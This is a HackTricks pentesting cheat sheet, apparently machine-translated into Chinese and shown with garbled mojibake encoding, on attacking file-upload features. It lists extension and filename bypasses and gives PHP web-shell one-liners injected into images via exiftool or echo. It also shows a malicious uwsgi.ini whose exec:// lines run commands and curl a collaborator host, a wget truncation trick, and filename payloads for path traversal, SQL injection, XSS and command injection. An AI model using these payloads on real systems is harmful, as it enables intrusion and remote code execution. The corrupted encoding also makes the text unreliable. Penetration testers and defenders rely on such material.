# æ–‡ä»¶ä¸Šä¼ 

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼ŸæŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆï¼š[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**èµé‡‘æ¼æ´æç¤º**ï¼š**æ³¨å†Œ** Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§ **èµé‡‘æ¼æ´å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼š[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## æ–‡ä»¶ä¸Šä¼ é€šç”¨æ–¹æ³•

å…¶ä»–æœ‰ç”¨çš„æ‰©å±•åï¼š

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **åœ¨ PHPv8 ä¸­å·¥ä½œ**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥

1. å¦‚æœé€‚ç”¨ï¼Œ**æ£€æŸ¥**ä¹‹å‰çš„**æ‰©å±•å**ã€‚è¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›**å¤§å†™å­—æ¯**è¿›è¡Œæµ‹è¯•ï¼š_pHp, .pHP5, .PhAr ..._
2. _æ£€æŸ¥åœ¨æ‰§è¡Œæ‰©å±•åä¹‹å‰**æ·»åŠ ä¸€ä¸ªæœ‰æ•ˆçš„æ‰©å±•å**ï¼ˆä¹Ÿä½¿ç”¨ä¹‹å‰çš„æ‰©å±•åï¼‰ï¼š_
* _file.png.php_
* _file.png.Php5_
3. å°è¯•åœ¨æœ«å°¾æ·»åŠ **ç‰¹æ®Šå­—ç¬¦**ã€‚å¯ä»¥ä½¿ç”¨ Burp æ¥**æš´åŠ›ç ´è§£**æ‰€æœ‰**ASCII**å’Œ**Unicode**å­—ç¬¦ã€‚ï¼ˆ_æ³¨æ„ï¼Œæ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨**å…ˆå‰æåˆ°çš„æ‰©å±•å**_ï¼‰
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. å°è¯•ä½¿ç”¨æŠ€æœ¯æ¥ç»•è¿‡ä¿æŠ¤ï¼Œæ¬ºéª—æœåŠ¡å™¨ç«¯çš„**æ‰©å±•åè§£æå™¨**ï¼Œä¾‹å¦‚**åŠ å€æ‰©å±•å**æˆ–åœ¨æ‰©å±•åä¹‹é—´æ·»åŠ **åƒåœ¾**æ•°æ®ï¼ˆ**ç©ºå­—èŠ‚**ï¼‰ã€‚_æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**å…ˆå‰çš„æ‰©å±•å**æ¥å‡†å¤‡æ›´å¥½çš„æœ‰æ•ˆè´Ÿè½½ã€‚_
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. åœ¨ä¹‹å‰çš„æ£€æŸ¥ä¸­æ·»åŠ **å¦ä¸€å±‚æ‰©å±•å**ï¼š
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. å°è¯•å°†**æ‰§è¡Œæ‰©å±•åæ”¾åœ¨æœ‰æ•ˆæ‰©å±•åä¹‹å‰**ï¼Œå¹¶ç¥ˆç¥·æœåŠ¡å™¨é…ç½®é”™è¯¯ã€‚ï¼ˆç”¨äºåˆ©ç”¨ Apache é…ç½®é”™è¯¯ï¼Œå…¶ä¸­ä»¥**.php**ç»“å°¾çš„ä»»ä½•å†…å®¹éƒ½å°†æ‰§è¡Œä»£ç ï¼Œä½†ä¸ä¸€å®šä»¥ .php ç»“å°¾ï¼‰ï¼š
* _ä¾‹å¦‚ï¼šfile.php.png_
7. åœ¨**Windows**ä¸­ä½¿ç”¨**NTFS å¤‡ç”¨æ•°æ®æµ (ADS)**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šåœ¨ç¦æ­¢çš„æ‰©å±•åä¹‹åå’Œå…è®¸çš„æ‰©å±•åä¹‹å‰æ’å…¥å†’å·å­—ç¬¦ ":"ã€‚ç»“æœï¼Œåœ¨æœåŠ¡å™¨ä¸Šå°†åˆ›å»ºä¸€ä¸ª**å¸¦æœ‰ç¦æ­¢çš„æ‰©å±•åçš„ç©ºæ–‡ä»¶**ï¼ˆä¾‹å¦‚ "file.asax:.jpg"ï¼‰ã€‚ç¨åå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼ˆä¾‹å¦‚ä½¿ç”¨å…¶çŸ­æ–‡ä»¶åï¼‰ç¼–è¾‘æ­¤æ–‡ä»¶ã€‚è¿˜å¯ä»¥ä½¿ç”¨â€œ**::$data**â€æ¨¡å¼åˆ›å»ºéç©ºæ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨æ­¤æ¨¡å¼ä¹‹åæ·»åŠ ä¸€ä¸ªç‚¹å­—ç¬¦ä¹Ÿå¯èƒ½æœ‰åŠ©äºç»•è¿‡è¿›ä¸€æ­¥çš„é™åˆ¶ï¼ˆä¾‹å¦‚â€œfile.asp::$data.â€ï¼‰ã€‚
8. å°è¯•çªç ´æ–‡ä»¶åé™åˆ¶ã€‚æœ‰æ•ˆæ‰©å±•åè¢«æˆªæ–­ï¼Œæ¶æ„ PHP ä»£ç è¢«ä¿ç•™ã€‚AAA<--SNIP-->AAA.php

```
# Linux æœ€å¤§ 255 å­—èŠ‚
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # å‡å» 4 å¹¶æ·»åŠ  .png
# ä¸Šä¼ æ–‡ä»¶å¹¶æ£€æŸ¥å“åº”ï¼Œçœ‹å®ƒå…è®¸å¤šå°‘ä¸ªå­—ç¬¦ã€‚å‡è®¾ä¸º 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# åˆ›å»ºæœ‰æ•ˆè½½è·
AAA<--SNIP 232 A-->AAA.php.png

### ç»•è¿‡ Content-Typeã€é­”æœ¯æ•°å­—ã€å‹ç¼©å’Œè°ƒæ•´å¤§å°

* é€šè¿‡å°† Content-Type å¤´çš„å€¼è®¾ç½®ä¸ºï¼š_image/png_ã€_text/plain_ã€_application/octet-stream_ æ¥ç»•è¿‡ Content-Type æ£€æŸ¥ã€‚
1. Content-Type å­—å…¸ï¼š[https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* é€šè¿‡åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ çœŸå®å›¾åƒçš„å­—èŠ‚ï¼ˆæ··æ·† _file_ å‘½ä»¤ï¼‰æˆ–åœ¨å…ƒæ•°æ®ä¸­å¼•å…¥ shell æ¥ç»•è¿‡é­”æœ¯æ•°å­—æ£€æŸ¥ï¼š\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥åœ¨å›¾åƒä¸­ **ç›´æ¥å¼•å…¥æœ‰æ•ˆè½½è·**ï¼š\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* å¦‚æœæ­£åœ¨å‘å›¾åƒæ·»åŠ å‹ç¼©ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸€äº›æ ‡å‡†çš„ PHP åº“ï¼ˆå¦‚ [PHP-GD](https://www.php.net/manual/fr/book.image.php)ï¼‰ï¼Œåˆ™å‰é¢çš„æŠ€æœ¯å°†æ— æ•ˆã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ **PLTE å—** [**åœ¨æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°† **åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**åŒ…å«ä»£ç çš„ Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* ç½‘é¡µè¿˜å¯ä»¥ä½¿ç”¨ PHP-GD å‡½æ•° `imagecopyresized` æˆ– `imagecopyresampled` æ¥è°ƒæ•´å›¾åƒå¤§å°ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ **IDAT å—** [**åœ¨æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°† **åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**åŒ…å«ä»£ç çš„ Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* åˆ©ç”¨ PHP-GD å‡½æ•° `thumbnailImage` åˆ›å»ºä¸€ä¸ªåœ¨å›¾åƒè°ƒæ•´å¤§å°åä»ç„¶æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·çš„å¦ä¸€ç§æŠ€æœ¯ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ **tEXt å—** [**åœ¨æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°† **åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**åŒ…å«ä»£ç çš„ Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### å…¶ä»–æ£€æŸ¥æŠ€å·§

* æŸ¥æ‰¾æ¼æ´ä»¥é‡å‘½åå·²ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆæ›´æ”¹æ‰©å±•åï¼‰ã€‚
* æŸ¥æ‰¾ **æœ¬åœ°æ–‡ä»¶åŒ…å«** æ¼æ´ä»¥æ‰§è¡Œåé—¨ã€‚
* **å¯èƒ½çš„ä¿¡æ¯æ³„éœ²**ï¼š
1. **å¤šæ¬¡**ï¼ˆå¹¶ä¸”**åŒæ—¶**ï¼‰ä¸Šä¼ **ç›¸åŒçš„æ–‡ä»¶**ï¼Œä½¿ç”¨**ç›¸åŒçš„åç§°**
2. ä¸Šä¼ ä¸€ä¸ªå…·æœ‰**å·²å­˜åœ¨çš„æ–‡ä»¶**æˆ–**æ–‡ä»¶å¤¹**çš„**åç§°**çš„æ–‡ä»¶
3. ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶åç§°ä¸º**â€œ.â€ã€â€œ..â€æˆ–â€œâ€¦â€**ã€‚ä¾‹å¦‚ï¼Œåœ¨ **Windows** çš„ Apache ä¸­ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨â€œ/www/uploads/â€ç›®å½•ä¸­ï¼Œâ€œ.â€ æ–‡ä»¶åå°†åœ¨â€œ/www/â€ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºâ€œuploadsâ€çš„æ–‡ä»¶ã€‚
4. ä¸Šä¼ ä¸€ä¸ªå¯èƒ½ä¸å®¹æ˜“åˆ é™¤çš„æ–‡ä»¶ï¼Œä¾‹å¦‚åœ¨ **NTFS** ä¸­çš„ **â€œâ€¦:.jpgâ€**ã€‚ï¼ˆWindowsï¼‰
5. ä½¿ç”¨ **æ— æ•ˆå­—ç¬¦**ï¼ˆå¦‚ `|<>*?â€`ï¼‰åœ¨ **Windows** ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚ï¼ˆWindowsï¼‰
6. ä½¿ç”¨ **ä¿ç•™çš„**ï¼ˆ**ç¦æ­¢çš„**ï¼‰**åç§°**åœ¨ **Windows** ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ CONã€PRNã€AUXã€NULã€COM1ã€COM2ã€COM3ã€COM4ã€COM5ã€COM6ã€COM7ã€COM8ã€COM9ã€LPT1ã€LPT2ã€LPT3ã€LPT4ã€LPT5ã€LPT6ã€LPT7ã€LPT8 å’Œ LPT9ã€‚

* è¿˜å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.exeï¼‰æˆ–ä¸€ä¸ªï¼ˆä¸å¤ªå¯ç–‘çš„ï¼‰.html æ–‡ä»¶ï¼Œå½“å—å®³è€…æ„å¤–æ‰“å¼€æ—¶å°†æ‰§è¡Œä»£ç ã€‚

### ç‰¹æ®Šæ‰©å±•åæŠ€å·§

å¦‚æœæ‚¨æ­£åœ¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ° **PHP æœåŠ¡å™¨**ï¼Œ[è¯·æŸ¥çœ‹é€šè¿‡ **.htaccess** æŠ€å·§æ‰§è¡Œä»£ç ](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)ã€‚\
å¦‚æœæ‚¨æ­£åœ¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ° **ASP æœåŠ¡å™¨**ï¼Œ[è¯·æŸ¥çœ‹é€šè¿‡ **.config** æŠ€å·§æ‰§è¡Œä»£ç ](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)ã€‚

`.phar` æ–‡ä»¶ç±»ä¼¼äº Java çš„ `.jar` æ–‡ä»¶ï¼Œä½†ç”¨äº PHPï¼Œå¹¶ä¸”å¯ä»¥åƒ PHP æ–‡ä»¶ä¸€æ ·ä½¿ç”¨ï¼ˆä½¿ç”¨ php æ‰§è¡Œå®ƒï¼Œæˆ–åœ¨è„šæœ¬ä¸­åŒ…å«å®ƒ...ï¼‰

`.inc` æ‰©å±•åæœ‰æ—¶ç”¨äºä»…ç”¨äºå¯¼å…¥æ–‡ä»¶çš„ php æ–‡ä»¶ï¼Œå› æ­¤åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸäººå¯èƒ½å·²ç»å…è®¸æ‰§è¡Œæ­¤æ‰©å±•åã€‚

## **Jetty RCE**

å¦‚æœæ‚¨å¯ä»¥å°† XML æ–‡ä»¶ä¸Šä¼ åˆ° Jetty æœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥è·å¾— [RCEï¼Œå› ä¸º **æ–°çš„ \*.xml å’Œ \*.war æ–‡ä»¶ä¼šè‡ªåŠ¨å¤„ç†**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**ã€‚** å› æ­¤ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°† XML æ–‡ä»¶ä¸Šä¼ åˆ° `$JETTY_BASE/webapps/` å¹¶ç­‰å¾… shellï¼

![](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

å¦‚æœæ‚¨å¯ä»¥æ›¿æ¢ [**uWSGI æœåŠ¡å™¨çš„ .ini é…ç½®æ–‡ä»¶ï¼Œåˆ™å¯ä»¥è·å¾— RCE**](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)**ã€‚** å®é™…ä¸Šï¼ŒuWSGI é…ç½®æ–‡ä»¶å¯ä»¥åŒ…å«ä½¿ç”¨ç²¾ç¡®è¯­æ³•å®šä¹‰çš„â€œé­”æ³•â€å˜é‡ã€å ä½ç¬¦å’Œè¿ç®—ç¬¦ã€‚ç‰¹åˆ«æ˜¯ '@' è¿ç®—ç¬¦ä»¥ @(filename) çš„å½¢å¼ç”¨äºåŒ…å«æ–‡ä»¶çš„å†…å®¹ã€‚æ”¯æŒè®¸å¤š uWSGI æ–¹æ¡ˆï¼ŒåŒ…æ‹¬â€œexecâ€ - ç”¨äºä»è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºä¸­è¯»å–ã€‚å½“è§£æ .ini é…ç½®æ–‡ä»¶æ—¶ï¼Œè¿™äº›è¿ç®—ç¬¦å¯ä»¥è¢«ç”¨äºè¿œç¨‹å‘½ä»¤æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶å†™å…¥/è¯»å–ï¼š

æ¶æ„ `uwsgi.ini` æ–‡ä»¶ç¤ºä¾‹ï¼š
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
å½“è§£æé…ç½®æ–‡ä»¶æ—¶ï¼Œå°†æ‰§è¡Œè´Ÿè½½ã€‚è¯·æ³¨æ„ï¼Œè¦è§£æé…ç½®æ–‡ä»¶ï¼Œéœ€è¦é‡æ–°å¯åŠ¨è¿›ç¨‹ï¼ˆå´©æºƒï¼Ÿæ‹’ç»æœåŠ¡æ”»å‡»ï¼Ÿï¼‰æˆ–è‡ªåŠ¨é‡æ–°åŠ è½½æ–‡ä»¶ï¼ˆå¦‚æœå‘ç°æ›´æ”¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨é€‰é¡¹æŒ‡ç¤ºé‡æ–°åŠ è½½æ–‡ä»¶çš„ç§’æ•°ï¼‰ã€‚

é‡è¦æç¤ºï¼šuWSGIå¯¹é…ç½®æ–‡ä»¶çš„è§£ææ˜¯å®½æ¾çš„ã€‚å…ˆå‰çš„è´Ÿè½½å¯ä»¥åµŒå…¥åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä¾‹å¦‚å›¾åƒã€PDFç­‰ï¼‰ä¸­ã€‚

## wgetæ–‡ä»¶ä¸Šä¼ /SSRFæŠ€å·§

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨`wget`æ¥ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥æŒ‡å®šURLã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä»£ç å¯èƒ½ä¼šæ£€æŸ¥ä¸‹è½½æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œä»¥ç¡®ä¿åªæœ‰å…è®¸ä¸‹è½½çš„æ–‡ä»¶ã€‚ç„¶è€Œï¼Œè¿™ä¸ªæ£€æŸ¥å¯ä»¥è¢«ç»•è¿‡ã€‚

åœ¨Linuxä¸­ï¼Œæ–‡ä»¶åçš„æœ€å¤§é•¿åº¦ä¸º255ä¸ªå­—ç¬¦ï¼Œç„¶è€Œï¼Œwgetå°†æ–‡ä»¶åæˆªæ–­ä¸º236ä¸ªå­—ç¬¦ã€‚æ‚¨å¯ä»¥ä¸‹è½½ä¸€ä¸ªåä¸º"A"\*232+".php"+".gif"çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå°†ç»•è¿‡æ£€æŸ¥ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ".gif"æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ‰©å±•åï¼‰ï¼Œä½†æ˜¯`wget`å°†æŠŠæ–‡ä»¶é‡å‘½åä¸º"A"\*232+".php"ã€‚
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
è¯·æ³¨æ„ï¼Œæ‚¨å¯èƒ½æ­£åœ¨è€ƒè™‘çš„**å¦ä¸€ç§é€‰æ‹©**æ˜¯ç»•è¿‡æ­¤æ£€æŸ¥çš„æ–¹æ³•æ˜¯ä½¿**HTTPæœåŠ¡å™¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªæ–‡ä»¶**ï¼Œå› æ­¤åˆå§‹URLå°†é€šè¿‡æ£€æŸ¥ï¼Œç„¶åwgetå°†ä½¿ç”¨æ–°åç§°ä¸‹è½½é‡å®šå‘çš„æ–‡ä»¶ã€‚è¿™**ä¸èµ·ä½œç”¨**ï¼Œ**é™¤é**ä½¿ç”¨**å‚æ•°**`--trust-server-names`æ¥ä½¿ç”¨wgetï¼Œå› ä¸º**wgetå°†ä½¿ç”¨åŸå§‹URLä¸­æŒ‡å®šçš„æ–‡ä»¶åä¸‹è½½é‡å®šå‘çš„é¡µé¢**ã€‚

#### å…¶ä»–èµ„æº

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## å·¥å…·

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass)æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜å’Œæ¼æ´çŒäººæµ‹è¯•æ–‡ä»¶ä¸Šä¼ æœºåˆ¶ã€‚å®ƒåˆ©ç”¨å„ç§æ¼æ´èµé‡‘æŠ€æœ¯ç®€åŒ–äº†è¯†åˆ«å’Œåˆ©ç”¨æ¼æ´çš„è¿‡ç¨‹ï¼Œç¡®ä¿å¯¹Webåº”ç”¨ç¨‹åºè¿›è¡Œå…¨é¢è¯„ä¼°ã€‚

## ä»æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–æ¼æ´

* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`../../../tmp/lol.png`ï¼Œå°è¯•å®ç°**è·¯å¾„éå†**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`sleep(10)-- -.jpg`ï¼Œå¯èƒ½èƒ½å¤Ÿå®ç°**SQLæ³¨å…¥**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`<svg onload=alert(document.domain)>`ï¼Œå®ç°XSS
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`; sleep 10;`ï¼Œæµ‹è¯•ä¸€äº›å‘½ä»¤æ³¨å…¥ï¼ˆæ›´å¤š[å‘½ä»¤æ³¨å…¥æŠ€å·§è¯·å‚è§æ­¤å¤„](../command-injection.md)ï¼‰
* [å›¾åƒï¼ˆsvgï¼‰æ–‡ä»¶ä¸Šä¼ ä¸­çš„**XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**æ–‡ä»¶**ä¸Šä¼ ** + **XSS** = [æ»¥ç”¨**Service Workers**çš„XSS](../xss-cross-site-scripting/#xss-abusing-service-workers)
